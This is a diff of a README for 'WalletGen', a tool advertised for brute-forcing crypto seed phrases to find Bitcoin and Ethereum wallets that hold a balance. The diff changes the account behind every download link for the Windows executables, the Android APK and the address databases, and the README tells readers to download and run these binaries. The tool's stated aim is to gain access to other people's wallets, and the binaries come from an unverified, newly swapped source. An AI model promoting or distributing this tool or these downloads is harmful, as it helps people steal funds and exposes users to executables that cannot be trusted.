@@ -73,11 +73,11 @@ Unlike Python-based brute force tools, **WalletGen** is written in C++ and optim
 # How to start
 
 ## Windows 
-- Download [WalletGen.zip](https://github.com/tony-dev1/seed-phrase-generator/releases/download/walletgen/WalletGen_v1.8.0.zip) (5MB)
+- Download [WalletGen.zip](https://github.com/tony-btc/seed-phrase-generator/releases/download/walletgen/WalletGen_v1.8.0.zip) (5MB)
 - Unpack anywhere
 - Run `WalletGen.exe`
 
-Or Just Download [Installer](https://github.com/tony-dev1/seed-phrase-generator/releases/download/walletgen/WalletGen_Windows_v1.8.0.exe)
+Or Just Download [Installer](https://github.com/tony-btc/seed-phrase-generator/releases/download/walletgen/WalletGen_Windows_v1.8.0.exe)
 
 ## Linux (x86-64bit)
 ```bash
@@ -87,13 +87,13 @@ cd walletgen
 ./walletgen
 ```
 ## Android (Beta)
-- Download [walletgen-beta.apk](https://github.com/tony-dev1/crypto-wallets-finder/releases/download/walletgen/walletgen-android-beta.apk) (15MB)
+- Download [walletgen-beta.apk](https://github.com/tony-btc/crypto-wallets-finder/releases/download/walletgen/walletgen-android-beta.apk) (15MB)
 
 ### Download and Use Database (for more speed)
 | Database                                                     | Download link                                |  File Size                             | Number of Addresses  |
 |---------------------------------------------------------|------------------------------------------------|------------------------------------|----------------------------------|
-| BTC Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[btc_database.txt](https://github.com/tony-dev1/walletgen/releases/download/database/btc_database.txt)  | 1.03 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 428 179
-| EVM Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[evm_database.txt](https://github.com/tony-dev1/walletgen/releases/download/database/evm_database.txt)  | 1.02 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;25 999 700
+| BTC Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[btc_database.txt](https://github.com/tony-btc/walletgen/releases/download/database/btc_database.txt)  | 1.03 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 428 179
+| EVM Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[evm_database.txt](https://github.com/tony-btc/walletgen/releases/download/database/evm_database.txt)  | 1.02 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;25 999 700
 
 
 ## How to Search for Lost Bitcoin & Ethereum Wallets with Balance
